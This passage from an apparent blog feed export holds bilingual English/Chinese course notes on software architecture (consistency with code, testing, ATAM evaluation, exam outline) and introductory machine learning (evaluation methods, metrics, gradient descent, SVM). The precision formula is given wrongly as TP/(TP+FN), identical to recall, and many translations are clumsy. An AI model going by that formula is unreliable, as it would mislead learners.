satisfied.<br>重复步骤1到4直到ASRS满足。</li></ol><h2 id="implementation"><a href="#implementation" class="headerlink" title="implementation"></a>implementation</h2><h3 id="Four-techniques-to-keep-the-code-and-the-architecture-consistent"><a href="#Four-techniques-to-keep-the-code-and-the-architecture-consistent" class="headerlink" title="Four techniques to keep the code and the architecture consistent:"></a>Four techniques to keep the code and the architecture consistent:</h3><ul><li>Embedding the design in the code<br><em>将设计嵌入代码中</em><br>实施者知道他们正在实施什么样的建筑结构。<br>它们可以将代码中的体系结构文档作为注释记录。然后任何人拿起代码都会知道一些约束条件。<br>然后工具可以自动关联代码和体系结构。</li><li>Frameworks<br><em>框架方法</em><br>框架是围绕特定主题组织起来的可重用的库或类集。<br>程序员使用框架提供的服务。</li><li>Code templates<br><em>代码模版方法</em><br>代码模板是代码集合，程序员在其中提供特定于应用程序的部分。</li><li>Keeping code and architecture consistent (i.e. avoiding architecture erosion)<br><em>保持代码和体系结构的一致性（即避免体系结构的侵蚀）</em><br>实现将偏离文档体系结构。<br>实施者可能做出的决定是不一致或相互或与架构。<br>架构可能没有预见，提出所有的可能性<h4 id="Preventing-Architecture-Erosion"><a href="#Preventing-Architecture-Erosion" class="headerlink" title="Preventing Architecture Erosion"></a>Preventing Architecture Erosion</h4>Use tools to enforce architectural constraints. can have architecture rules added that are enforced<br>during a build<br>Give more credence/freedom to remaining portion when creating code template<br>Schedule documentation/code synchronization times.<br>使用工具强制架构约束。可以添加被强制执行的架构规则<br>在生成过程中<br>在创建代码模板时，给剩下的部分更多的信任/自由<br>计划文档/代码同步时间。</li></ul><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><h3 id="Two-Levels-of-Testing"><a href="#Two-Levels-of-Testing" class="headerlink" title="Two Levels of Testing"></a>Two Levels of Testing</h3><h4 id="Unit-testing-tests-running-on-specific-pieces-of-software"><a href="#Unit-testing-tests-running-on-specific-pieces-of-software" class="headerlink" title="Unit testing: tests running on specific pieces of software."></a>Unit testing: tests running on specific pieces of software.</h4><p>What is needed to test:<br>– Responsibilities for functional correctness<br>功能正确性的职责<br>– Performance through synthetic loads<br>综合负荷性能<br>– Availability through fault injection.<br>通过故障注入的可用性。<br>– Modifiability requirements can also be tested by assigning changes to test teams.<br>可变性的要求也可以通过分配的变化，测试团队进行测试。</p><h4 id="Integration-Testing-to-test-what-happens-when-separate-software-units-start-to-work-together"><a href="#Integration-Testing-to-test-what-happens-when-separate-software-units-start-to-work-together" class="headerlink" title="Integration Testing: to test what happens when separate software units start to work together"></a>Integration Testing: to test what happens when separate software units start to work together</h4><p>Integration test can test functionality, performance, availability, and security.<br>Security can be tested by having the test executes various attack scenarios.<br>Systems may degrade after being run for a long time if resources are not freed or a configuration is incorrectly specified.<br>集成测试可以测试功能、性能、可用性和安全性。<br>通过测试执行各种攻击场景，可以对安全性进行测试。<br>如果资源未释放或配置错误指定，系统运行很长时间后可能会降级。</p><h5 id="Black-Box-Testing"><a href="#Black-Box-Testing" class="headerlink" title="Black-Box Testing"></a>Black-Box Testing</h5><h5 id="White-Box-Testing"><a href="#White-Box-Testing" class="headerlink" title="White-Box Testing"></a>White-Box Testing</h5><h2 id="evaluation"><a href="#evaluation" class="headerlink" title="evaluation"></a>evaluation</h2><p>Three Forms of Evaluation</p><h3 id="Evaluation-by-the-designer-within-the-design-process"><a href="#Evaluation-by-the-designer-within-the-design-process" class="headerlink" title="Evaluation by the designer within the design process."></a>Evaluation by the designer within the design process.</h3><p>设计者在设计过程中的评价。<br>Every time the designer makes a key design decision, the chosen alternatives should be evaluated<br>每次设计者做出关键的设计决策时，所选择的方案都要进行评估。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">How much analysis? Three factors include:</span><br><span class="line">– The importance of the decision.</span><br><span class="line">决定的重要性。</span><br><span class="line">– The number of potential alternatives. More alternatives need more time in evaluating them.</span><br><span class="line">潜在替代品的数量。更多的选择需要更多的时间来评估它们。</span><br><span class="line">– Good enough as opposed to perfect. Do not spend more time on a decision than it is worth.</span><br><span class="line">-足够好，而不是完美。不要把更多的时间花在决定上，而不是花在它的价值上。</span><br></pre></td></tr></table></figure></p><h3 id="Evaluation-by-peers-within-the-design-process"><a href="#Evaluation-by-peers-within-the-design-process" class="headerlink" title="Evaluation by peers within the design process."></a>Evaluation by peers within the design process.</h3><p>同行在设计过程中的评价。<br>Architectural designs can be peer reviewed, just as code can.<br>建筑设计可以像代码一样进行同行评审。<br>A peer review can be carried out at any point of the design process where a candidate architecture, or at least a coherent reviewable part of one, exists.<br>同行评审可以进行在任何点的设计过程中，候选建筑，或者至少是一个连贯的审查的一部分，存在。<br>Allocate at least several hours and possibly half a day.<br>分配至少几个小时，可能半天</p><h3 id="Analysis-by-outsiders-once-the-architecture-has-been-designed"><a href="#Analysis-by-outsiders-once-the-architecture-has-been-designed" class="headerlink" title="Analysis by outsiders once the architecture has been designed."></a>Analysis by outsiders once the architecture has been designed.</h3><p>一旦架构被设计出来，由局外人分析。<br>“Outside” is relative; this may mean<br>– outside the development project<br>– outside the business unit where the project resides but within the same company<br>– outside the company.<br>“外”是相对的，这可能意味着<br>-在开发项目之外<br>-在项目所在的业务单元之外 但在同一家公司<br>-公司以外<br>Outsiders are chosen because they possess specialized knowledge or experience<br>Managers tend to be more inclined to listen to problems uncovered by an outside team.<br>Be used to evaluate complete architectures.<br>外人之所以选择，是因为他们具有专门知识或经验。<br>经理倾向于更倾向于倾听外部团队发现的问题。<br>用于评估完整的体系结构。</p><h4 id="ATAM-Architecture-Tradeoff-Analysis-Method-架构权衡分析方法"><a href="#ATAM-Architecture-Tradeoff-Analysis-Method-架构权衡分析方法" class="headerlink" title="ATAM = Architecture Tradeoff Analysis Method = 架构权衡分析方法"></a>ATAM = Architecture Tradeoff Analysis Method = 架构权衡分析方法</h4><p>Step 1: Present the ATAM<br>Step 2: Present Business Drivers<br>Step 3: Present the Architecture<br>Step 4: Identify Architectural Approaches<br>Step 5: Generate Utility Tree<br>Step 6: Analyze Architectural Approaches<br>Step 7: Brainstorm and Prioritize Scenarios<br>Step 8: Analyze Architectural Approaches<br>Step 9: Present Results<br>步骤1：介绍ATAM<br>步骤2：现在的业务驱动程序<br>步骤3：呈现架构<br>步骤4：确定架构方法<br>步骤5：生成Utility Tree<br>步骤6：分析架构方法<br>步骤7：头脑风暴和优先考虑情景<br>步骤8：分析架构方法<br>步骤9：展示结果</p><h4 id="Lightweight-Architectural-Evaluation"><a href="#Lightweight-Architectural-Evaluation" class="headerlink" title="Lightweight Architectural Evaluation"></a>Lightweight Architectural Evaluation</h4><p>An ATAM is a substantial undertaking<br>– It requires some 20 to 30 person-days of effort from an<br>evaluation team, plus even more for the architect and<br>stakeholders.<br>– Investing this amount of time makes sense on a large and<br>costly project<br>• A Lightweight Architecture Evaluation method for<br>smaller, less risky projects.<br>– May take place in a single day, or even a half-day meeting.<br>– May be carried out entirely by members internal to the<br>organization.<br>– Of course this may not probe the architecture as deeply</p><h4 id="Architecture-and-Product-Lines"><a href="#Architecture-and-Product-Lines" class="headerlink" title="Architecture and Product Lines"></a>Architecture and Product Lines</h4><p>A product line is strategic, planned reuse.<br>• The product line approach to developing software can pay huge dividends.<br>• Requires an understanding of:<br>– Architecture<br>– Organizational issues<br>– Process issues<br>产品线是战略性的、计划重用的。<br>•开发软件的产品线方法可以带来巨大的收益。<br>•需要了解：<br>–架构<br>–组织问题<br>–过程问题</p><h1 id="Architesture-in-the-Cloud"><a href="#Architesture-in-the-Cloud" class="headerlink" title="Architesture in the Cloud"></a>Architesture in the Cloud</h1><p>Cloud computing is an information technology (IT) paradigm that enables ubiquitous access to shared pools of system resources and higherlevel services that can be rapidly provisioned with minimal management effort, often over the Internet.<br>云计算是信息技术（IT）的范式，使随时随地访问系统资源和高层次的服务，可以快速配置以最小的管理工作共享池，经常在互联网上。<br>The cloud provides a new platform for applications with some different characteristics.<br>Architect needs to know how a cloud cluster works and pay special attention to<br>– Security<br>– Performance<br>– Availability<br>云提供了一个具有不同特性的应用程序的新平台。<br>架构师需要知道云集群是如何工作的，并特别关注<br>–安全<br>–性能<br>–可用性</p><h1 id="复习提纲"><a href="#复习提纲" class="headerlink" title="复习提纲"></a>复习提纲</h1><h2 id="Part-I-Introduction-of-software-architecture"><a href="#Part-I-Introduction-of-software-architecture" class="headerlink" title="Part I Introduction of software architecture"></a>Part I Introduction of software architecture</h2><h3 id="What"><a href="#What" class="headerlink" title="What?"></a>What?</h3><ul><li>definition</li><li>3 types of structures</li><li>architecture</li><li>patterns &amp; tactics</li></ul><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><ul><li>4 Context of Software Architecture</li></ul><h2 id="Part-II-Quality-attributes"><a href="#Part-II-Quality-attributes" class="headerlink" title="Part II Quality attributes"></a>Part II Quality attributes</h2><h3 id="Availability-interoperability-modifiability-performance-security-testability-usability-and-others"><a href="#Availability-interoperability-modifiability-performance-security-testability-usability-and-others" class="headerlink" title="Availability, interoperability, modifiability, performance, security, testability, usability and others"></a>Availability, interoperability, modifiability, performance, security, testability, usability and others</h3><ul><li>Definitions, general scenarios &amp; concrete scenarios of<br>quality attributes, tactics</li><li>Architecture patterns and tactics</li><li>Quality attributes modeling and analysis: availability and performance</li></ul><h2 id="Part-III-Architecture-in-the-life-cycle"><a href="#Part-III-Architecture-in-the-life-cycle" class="headerlink" title="Part III Architecture in the life cycle"></a>Part III Architecture in the life cycle</h2><ul><li>Architecture in agile project: architecture and<br>agility</li><li>Architecture and requirement: approaches to<br>gather ASR, utility tree</li><li>Designing an architecture: design strategies, ADD</li><li>Architecture, implementation, and testing</li><li>Architecture evaluations</li></ul><h2 id="Other-parts"><a href="#Other-parts" class="headerlink" title="Other parts"></a>Other parts</h2><ul><li>Software product lines</li><li>Architecture in the cloud</li></ul><p>Chapter 1. What is Software Architecture?<br>理解：软件体系结构（软件架构）的定义、架构模式的概念。<br>掌握：软件系统有哪几类结构？在每类结构里，元素及其之间的关系是什么？每类结构各有哪些常见的结构？其特点是什么？<br>了解：结构与视图是什么关系？好的结构的一些经验法则。</p><p>Chapter 2. Why is Software Architecture Important?<br>理解：13个理由。</p><p>Chapter 3. The Many Contexts of Software Architecture<br>理解：技术环境、项目生命周期、商业环境、架构师职业环境中的软件体系结构。架构与环境的相互影响。<br>了解：涉众。</p><p>Chapter 4. Understanding Quality Attributes<br>了解：系统的功能需求。功能需求与系统架构的关系。功能需求与质量需求的关系。系统约束。<br>理解：系统的质量需求。战术的概念。<br>掌握：质量属性场景的概念和举例。质量设计的7种决策。</p><p>Chapter 5. Availability<br>理解：可用性概念。<br>了解：可用性公式。可用性一般场景。<br>掌握：可用性战术。可用性设计清单。</p><p>Chapter 6. Interoperability<br>理解：互操作性概念。<br>了解：互操作性一般场景。<br>掌握：互操作性战术。互操作性设计清单。</p><p>Chapter 7. Modifiability<br>理解：可修改性概念。<br>了解：可修改性一般场景。<br>掌握：可修改性战术。可修改性设计清单。</p><p>Chapter 8. Performance<br>理解：性能概念。<br>了解：性能公式。性能一般场景。<br>掌握：性能战术。性能设计清单。</p><p>Chapter 9. Security<br>理解：安全性概念。<br>了解：安全一般场景。<br>掌握：安全性战术。安全性设计清单。</p><p>Chapter 10. Testability<br>理解：可测试性概念。<br>了解：可测试性一般场景。<br>掌握：可测试性战术。可测试性设计清单。</p><p>Chapter 11. Usability<br>理解：易用性概念。<br>了解：易用性一般场景。<br>掌握：易用性战术。易用性设计清单。</p><p>Chapter 12. Other Quality Attributes<br>了解：其它软件质量属性如可变性、可移植性、开发可分布性、伸缩性、可部署性、移动性、可监控性、生命财产安全性。其它类别的质量属性如架构质量属性、商业属性、系统质量属性。ISO/IEC FCD 25010 产品质量标准。<br>理解：如何处理未知的质量属性。</p><p>Chapter 13. Patterns and Tactics<br>了解：架构模式（架构风格）的概念。<br>掌握：层次模式、代理模式、MVC模式、管道-过滤器模式、CS模式、P2P模式、SOA模式、发布订阅模式、共享数据模式、Map-Reduce模式、多级模式。<br>理解：模式与战术的关系。</p><p>Chapter 14. Quality Attribute Modeling and Analysis<br>了解：模型。常见质量属性模型的成熟度。<br>了解：思想实验。粗略分析。原型。模拟仿真。实验。</p><p>Chapter 15. Architectures in Agile Projects<br>了解：敏捷开发思想与准则。<br>理解：敏捷开发的甜蜜点。<br>了解：敏捷开发与架构编档。敏捷开发与架构演化。</p><p>Chapter 16. Architecture and Requirements<br>理解：ASR。ASR的几种获取方法。QAW。<br>了解：商业目标场景。<br>理解：PALM方法。<br>掌握：效用树。</p><p>Chapter 17. Designing an Architecture<br>理解：Generate and Test（架构设计的假设检验法）。初始化、迭代、终结。<br>掌握：ADD方法。</p><p>Chapter 18. Documenting Software Architectures<br>理解：架构编档的重要性。架构文档的用途、读者。<br>了解：如何选择视图进行编档。<br>掌握：如何对视图进行编档。视图文档模版。架构文档摘要信息。如何对系统行为进行编档。如何对质量属性进行编档。</p><p>Chapter 19. Architecture, Implementation, and Testing<br>理解：实现与架构的一致性。<br>掌握：将架构嵌入代码。框架方法。代码模版方法。防止架构侵蚀。<br>了解：架构师在测试中的角色。</p><p>Chapter 20. Architecture Reconstruction and Conformance<br>了解：架构重构的背景和目的。<br>理解：架构重构的阶段。每个阶段的方法。</p><p>Chapter 21. Architecture Evaluation<br>了解：架构评审的3种形式及其特点。轻量级架构评审。<br>掌握：ATAM方法：目的、参与人员、步骤、采用的方法、结论。</p>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件体系架构 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>机器学习</title>
      <link href="//blog/2017/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0.html"/>
      <url>//blog/2017/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<p><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script></p><h1 id="1-绪论"><a href="#1-绪论" class="headerlink" title="1. 绪论"></a>1. 绪论</h1><h3 id="人类的强大-在于-经验-创新"><a href="#人类的强大-在于-经验-创新" class="headerlink" title="人类的强大 在于 经验 + 创新"></a>人类的强大 在于 <strong>经验</strong> + <strong>创新</strong></h3><h2 id="问题-是否能够让程序根据经验来改进自身以满足需求或外界的变化？"><a href="#问题-是否能够让程序根据经验来改进自身以满足需求或外界的变化？" class="headerlink" title="问题:是否能够让程序根据经验来改进自身以满足需求或外界的变化？"></a>问题:是否能够让程序根据<em>经验</em>来改进自身以满足需求或外界的变化？</h2><h2 id="机器学习致力于研究通过计算的手段，利用经验来改进自己的性能。"><a href="#机器学习致力于研究通过计算的手段，利用经验来改进自己的性能。" class="headerlink" title="机器学习致力于研究通过计算的手段，利用经验来改进自己的性能。"></a>机器学习致力于研究通过计算的手段，利用经验来改进自己的性能。</h2><p>经验–&gt;来自数据<br>利用经验的方式–&gt; 模型<br>计算的手段–&gt;从数据中产生模型的方法–&gt;学习算法</p><table><thead><tr><th style="text-align:center">Item1</th><th style="text-align:center">Item2</th></tr></thead><tbody><tr><td style="text-align:center">data</td><td style="text-align:center">Different applications have different data.</td></tr><tr><td style="text-align:center">model(function)</td><td style="text-align:center">Define the model according to specific problem.</td></tr><tr><td style="text-align:center">loss(prediction)</td><td style="text-align:center">Using loss function to evaluation model</td></tr></tbody></table><h3 id="貌似现在接触的机器学习大多数都是针对结构化的数据，我们称一条结构化的数据为一条记录或一个样本，记录的集合为数据集。"><a href="#貌似现在接触的机器学习大多数都是针对结构化的数据，我们称一条结构化的数据为一条记录或一个样本，记录的集合为数据集。" class="headerlink" title="貌似现在接触的机器学习大多数都是针对结构化的数据，我们称一条结构化的数据为一条记录或一个样本，记录的集合为数据集。"></a>貌似现在接触的机器学习大多数都是针对结构化的数据，我们称一条结构化的数据为一条记录或一个样本，记录的集合为<strong>数据集</strong>。</h3><h3 id="监督学习原理"><a href="#监督学习原理" class="headerlink" title="监督学习原理"></a>监督学习原理</h3><h4 id="存在某个不为人知的规律，即y与X有关系，我们猜测是满足下面这种形式"><a href="#存在某个不为人知的规律，即y与X有关系，我们猜测是满足下面这种形式" class="headerlink" title="存在某个不为人知的规律，即y与X有关系，我们猜测是满足下面这种形式"></a>存在某个不为人知的规律，即y与X有关系，我们猜测是满足下面这种形式</h4><p>$$y=f(X)=\omega X+b$$</p><h4 id="该公式代表了一系列的具体的公式，我们需要通过一些已知的y0和X0的关系来逐步修改公式来逼近真实情况"><a href="#该公式代表了一系列的具体的公式，我们需要通过一些已知的y0和X0的关系来逐步修改公式来逼近真实情况" class="headerlink" title="该公式代表了一系列的具体的公式，我们需要通过一些已知的y0和X0的关系来逐步修改公式来逼近真实情况"></a>该公式代表了一系列的具体的公式，我们需要通过一些已知的y0和X0的关系来逐步修改公式来逼近真实情况</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. define a set of function</span><br><span class="line">2. goodless of function</span><br><span class="line">3. pick the best function</span><br></pre></td></tr></table></figure><h3 id="分类与回归"><a href="#分类与回归" class="headerlink" title="分类与回归"></a>分类与回归</h3><p><strong>分类</strong>：预测的是离散值<br><strong>回归</strong>：预测的是连续值</p><h3 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h3><h3 id="聚类"><a href="#聚类" class="headerlink" title="聚类"></a>聚类</h3><h4 id="奥卡姆剃刀-Occam’s-razor"><a href="#奥卡姆剃刀-Occam’s-razor" class="headerlink" title="奥卡姆剃刀(Occam’s razor)"></a>奥卡姆剃刀(Occam’s razor)</h4><p>若有多个假设与观察一致，则选最简单的那一个。</p><p>机器学习的目标是使学得的模型能很好地适用于<em>新样本</em>。</p><h1 id="2-模型评估与选择"><a href="#2-模型评估与选择" class="headerlink" title="2. 模型评估与选择"></a>2. 模型评估与选择</h1><h3 id="经验误差与过拟合"><a href="#经验误差与过拟合" class="headerlink" title="经验误差与过拟合"></a>经验误差与过拟合</h3><p>error rate=错误率：分类错误的样本数占样本总数的比例<br>accuracy=精度：分类正确的样本数占样本总数的比例<br>error=误差：学习器的实际预测输出与样本的真实输出之间的差异<br>training error=训练误差/empirical error=经验误差：在训练集上的误差<br>generalization error=泛化误差：在新样本上的误差</p><h3 id="评估方法"><a href="#评估方法" class="headerlink" title="评估方法"></a>评估方法</h3><h4 id="留出法hold-out"><a href="#留出法hold-out" class="headerlink" title="留出法hold-out"></a>留出法hold-out</h4><p>直接将数据集划分成互斥的两个集合<br>一般需要若干次随机划分，取平均值。2/3～4/5样本用于训练</p><h4 id="交叉验证法corss-validation"><a href="#交叉验证法corss-validation" class="headerlink" title="交叉验证法corss validation"></a>交叉验证法corss validation</h4><p>将数据集划分成k个大小相似的互斥子集，k-1个作为训练集，另外1个作为测试集<br>k折交叉验证 k-fold cross validation</p><h5 id="10次10折交叉验证"><a href="#10次10折交叉验证" class="headerlink" title="10次10折交叉验证"></a>10次10折交叉验证</h5><h5 id="留一法Leave-One-out"><a href="#留一法Leave-One-out" class="headerlink" title="留一法Leave-One-out"></a>留一法Leave-One-out</h5><p>n个样本，分成n份的交叉验证。</p><h4 id="自助法-bootstrapping"><a href="#自助法-bootstrapping" class="headerlink" title="自助法 bootstrapping"></a>自助法 bootstrapping</h4><p>自助采样法(bootstrap samping)<br>包外估计(out-of-bag estimate)<br>自助法对数据集较小、难以有效划分训练集和测试集时很有用。但是，改变了初始数据集的分布，引入了估计偏差。</p><h3 id="调参与最终模型"><a href="#调参与最终模型" class="headerlink" title="调参与最终模型"></a>调参与最终模型</h3><p>parameter tuning=调参<br>validation set=验证集</p><h3 id="性能度量performance-measure"><a href="#性能度量performance-measure" class="headerlink" title="性能度量performance measure"></a>性能度量performance measure</h3><p>回归问题中最常见的性能度量是均方误差mean squared error</p><h3 id="查准率-精确率precision、查全率-召回率recall、F1"><a href="#查准率-精确率precision、查全率-召回率recall、F1" class="headerlink" title="查准率=精确率precision、查全率=召回率recall、F1"></a>查准率=精确率precision、查全率=召回率recall、F1</h3><table><thead><tr><th style="text-align:center"></th><th style="text-align:center"></th><th style="text-align:center"></th></tr></thead><tbody><tr><td style="text-align:center"></td><td style="text-align:center">预测正例</td><td style="text-align:center">预测反例</td></tr><tr><td style="text-align:center">真实正例</td><td style="text-align:center">真正例TP</td><td style="text-align:center">假反例FN</td></tr><tr><td style="text-align:center">真实反例</td><td style="text-align:center">假正例FP</td><td style="text-align:center">真反例TN</td></tr></tbody></table><p>$$P = { TP \over TP + FN}.$$<br>$$R= { TP \over TP+FN}.$$</p><p>Break-Even Point平衡点：查准率=查全率 的取值。</p><h3 id="F1"><a href="#F1" class="headerlink" title="F1"></a>F1</h3><p>$$F1 = { {2 \times P \times R} \over {P + R} } = { {2 \times TP} \over { 样例总数 + TP -TN } }$$</p><h4 id="当对于-P-和-R-有侧重时"><a href="#当对于-P-和-R-有侧重时" class="headerlink" title="当对于 P 和 R 有侧重时"></a>当对于 P 和 R 有侧重时</h4><p>$$F_\beta=\frac{(1 + \beta^2) \times P \times R}{(\beta^2 \times P) + R}$$</p><ul><li>当 $\beta = 1$，退化为F1</li><li>当 $\beta &gt; 1$，查全率比较重要</li><li>当 $\beta &lt; 1$，查准率比较重要</li></ul><h3 id="ROC-与-AUC"><a href="#ROC-与-AUC" class="headerlink" title="ROC 与 AUC"></a>ROC 与 AUC</h3><h4 id="ROC-Receiver-Operating-Characteristic-受试者工作特征"><a href="#ROC-Receiver-Operating-Characteristic-受试者工作特征" class="headerlink" title="ROC = Receiver Operating Characteristic = 受试者工作特征"></a>ROC = Receiver Operating Characteristic = 受试者工作特征</h4><p>真正例率<br>$$ TPR = {TP \over TP + FN}$$<br>假正例率<br>$$ FPR = {FP \over TN + FP}$$</p><h4 id="AUC-Area-Under-ROC-Curve"><a href="#AUC-Area-Under-ROC-Curve" class="headerlink" title="AUC = Area Under ROC Curve"></a>AUC = Area Under ROC Curve</h4><p>ROC底下面积，越大越好</p><h3 id="代价矩阵"><a href="#代价矩阵" class="headerlink" title="代价矩阵"></a>代价矩阵</h3><p>由于可能对于分类错误的情况会造成不同的代价，可以引入代价矩阵，将最优化变为希望最小化<em>总体代价</em></p><h2 id="线性模型"><a href="#线性模型" class="headerlink" title="线性模型"></a>线性模型</h2><h4 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h4><p>$$f(x)=\omega_1x_1+\omega_2x_2+…+\omega_dx_d+b$$<br>向量形式<br>$$f(x)=\omega^Tx+b$$</p><h1 id="复习提纲"><a href="#复习提纲" class="headerlink" title="复习提纲"></a>复习提纲</h1><h2 id="BasicConcept-都考"><a href="#BasicConcept-都考" class="headerlink" title="BasicConcept 都考"></a>BasicConcept 都考</h2><ol><li>Basic Concepts about Machine Learning<br>Q1. What is Machine Learning?<br>A1. Mchine Learning compose of three parts:<ul><li>Data</li><li>Model(function)</li><li>Loss(prediction)<br>|Item1|Item2|<br>|:-:|:-:|<br>|data|Different applications have different data.|<br>|model(function)|Define the model according to specific problem.|<br>|loss(prediction)|Using loss function to evaluation model|</li></ul></li></ol><p>Supervised learning is the machine learning task of inferring a function from labeled training data<br>监督学习是从标记训练数据推断函数的机器学习任务。</p><ol><li><p>Linear Regression<br>Simple linear regression describes the linear relationship between a predictor variable, plotted on the x-axis, and a response variable, plotted on the y-axis<br>简单线性回归描述了预测变量之间的线性关系，绘制在x轴上，并在y轴上绘制一个响应变量。</p></li><li><p>Closed-form solution 封闭解</p></li></ol><p>许多矩阵是不可逆的。<br>大矩阵的逆需要巨大的内存。<br>逆运算需要O（m 3）来计算。</p><p>所以使用 Gradient Descent 梯度下降</p><ol><li>Gradient Descent</li></ol><p>Learning rate η has a large impact on convergence<br>Too large η → oscillatory and may even diverge<br>Too small η → too slow to converge<br>学习率η对收敛的影响较大<br>太大的η→振荡，甚至发散<br>太小η→太慢收敛</p><p>Adaptive learning rate(For example):<br>Set larger learning rate at the begining<br>Use relatively smaller learning rate in the later epochs<br>Decrease the learning rate: η t+1 = η t / t+1<br>自适应学习率（例如）：<br>一开始就设置较大的学习率<br>在以后的时代使用相对较小的学习率<br>减少学习率：η t+1 =η t / t+1</p><h2 id="Linear-Classfication：-Dual-SVM及其推导不考"><a href="#Linear-Classfication：-Dual-SVM及其推导不考" class="headerlink" title="Linear Classfication： Dual SVM及其推导不考"></a>Linear Classfication： Dual SVM及其推导不考</h2><ol><li>Linear Classification<br>f(xi)<br>≥ 0 yi = +1<br>&lt; 0 yi = −1</li></ol><p>i.e. yi f(xi) &gt; 0 for a correct classification</p><ol><li>Support Vector Machine<br>What’s a Good Decision Boundary<br>什么是好的决策边界？<br>Maximum margin solution: most stable under perturbations of the inputs<br>最大间隔解：在输入扰动下最稳定</li></ol><p>Select two parallel hyperplanes that separate the two classes of data and let the distance between them as large as possible<br>The region bounded by these two hyperplanes is called the ”margin”<br>选择两个平行的超平面分开两类数据，让他们之间的距离尽可能大<br>该区域范围内的两平面称为“边缘”</p><p>In general there is a trade off between the margin and the number of mistakes on the training data</p><p>软间隔 soft margin<br>松弛变量 slack variables</p><ol><li>Stochastic Gradient Descent<br>True gradient descent is a batch algorithm, slow but sure<br>真正的梯度下降是一个批处理算法，缓慢但肯定<br>Information is redundant<br>Sufficient samples means we can afford more frequent, noisy updates<br>Never-ending stream means we should not wait for all data<br>Tracking non-stationary data means that the target is moving<br>信息是多余的<br>充足的样本意味着我们能负担得起更频繁、更嘈杂的更新。<br>永不结束流意味着我们不应该等待所有数据。<br>跟踪非平稳数据意味着目标在移动。</li></ol><p>Better for large datasets and often faster convergence<br>Hard to reach high accuracy<br>Best classical methods can not handle stochastic approximation<br>Theoretical definitions for convergence not as well defined<br>对于大型数据集，往往更快收敛<br>难以达到高精度<br>最好的经典方法不能处理随机逼近。<br>收敛性定义不明确的理论定义</p><h4 id="SGD的好处"><a href="#SGD的好处" class="headerlink" title="SGD的好处"></a>SGD的好处</h4><ol><li>Gradient is easy to calculate (instantaneous)</li><li>Less prone to local minima</li><li>Small memory footprint</li><li>Get to a reasonable solution quickly</li><li>Works for non-stationary environments as well as online settings</li><li>Can be used for more complex models and error surfaces<br>梯度很容易计算（瞬时）<br>不易发生局部极小<br>小内存占用<br>迅速找到合理的解决办法<br>适用于非平稳环境以及在线设置。<br>可用于更复杂的模型和错误表面。<h4 id="Is-convergence-necessary"><a href="#Is-convergence-necessary" class="headerlink" title="Is convergence necessary?"></a>Is convergence necessary?</h4>Non-stationary: convergence may not be required<br>Stationary: learning rate should decrease with time<br>Robbins-Monroe sequence is adequate ηt = 1/t<h4 id="Mini-batch-Stochastic-Gradient-Descent"><a href="#Mini-batch-Stochastic-Gradient-Descent" class="headerlink" title="Mini-batch Stochastic Gradient Descent"></a>Mini-batch Stochastic Gradient Descent</h4>小批量梯度下降<h2 id="SGD-Recommenddations"><a href="#SGD-Recommenddations" class="headerlink" title="SGD Recommenddations"></a>SGD Recommenddations</h2></li><li>Randomly shuffle training examples<br>Although theory says you should randomly pick examples, it is easier to make a pass through your training set sequentially<br>Shuffling before each iteration eliminates the effect of order<br>随机洗牌训练示例<br>虽然理论说你应该随机挑选例子，但是更容易通过你的训练集顺序。<br>每次迭代之前进行洗牌消除了订单的影响。</li><li>Monitor both training cost and validation error<br>Set aside samples for a decent validation set<br>Compute the objective on the training set and validation set (expensive but better than overfitting or wasting computation)<br>监控培训成本和验证错误<br>为正确的验证集预留样本<br>在训练集和验证集的目的计算（贵，但比过拟合或浪费计算）</li><li>Check gradient using finite differences<br>If computation is slightly incorrect can yield erratic and slow algorithm<br>Verify your code by slightly perturbing the parameter and inspecting differences between the two gradients<br>利用有限差分检验梯度<br>如果计算稍不正确，则会产生不稳定和缓慢的算法。<br>通过轻微的扰动参数和检验两者之间的梯度差异，验证你的代码</li><li>Experiment with the learning rates using small sample of training set<br>SGD convergence rates are independent from sample size<br>Use traditional optimization algorithms as a reference point<br>用训练样本的小样本进行学习率的实验<br>SGD的收敛速度是独立样本<br>使用传统的优化算法作为参考点</li><li>Leverage sparsity of the training examples<br>For very high-dimensional vectors with few non zero coefficients, you only need to update the weight coefficients corresponding to nonzero pattern in x<br>利用训练样本的稀疏性<br>对于很少的非零系数的高维向量，只需更新x中对应于非零模式的权系数。</li><li>Use learning rates of the form ηt = η0/(1 + η0λt)<br>Allows you to start from reasonable learning rates determined by testing on a small sample<br>Works well in most situations if the initial point is slightly smaller than best value observed in training sample<br>使用表格ηT = 0 /η学习率（1 + 0ηλT）<br>允许你从一个小样本测试中确定的合理学习率开始。<br>如果初始点略小于训练样本中观察到的最佳值，那么在大多数情况下都能很好地工作。</li></ol><h2 id="Logistic-Regression-and-Softmax-Regression：-都考"><a href="#Logistic-Regression-and-Softmax-Regression：-都考" class="headerlink" title="Logistic Regression and Softmax Regression： 都考"></a>Logistic Regression and Softmax Regression： 都考</h2><h4 id="Logistic-Regression"><a href="#Logistic-Regression" class="headerlink" title="Logistic Regression"></a>Logistic Regression</h4><p>还没懂</p><h4 id="Softmax-Regression"><a href="#Softmax-Regression" class="headerlink" title="Softmax Regression"></a>Softmax Regression</h4><p>还没懂</p><h2 id="Multiclass-classification：-Hierarchical-classification-不考"><a href="#Multiclass-classification：-Hierarchical-classification-不考" class="headerlink" title="Multiclass classification： Hierarchical classification 不考"></a>Multiclass classification： Hierarchical classification 不考</h2><p>那不看先</p><h2 id="Cross-Validation都考"><a 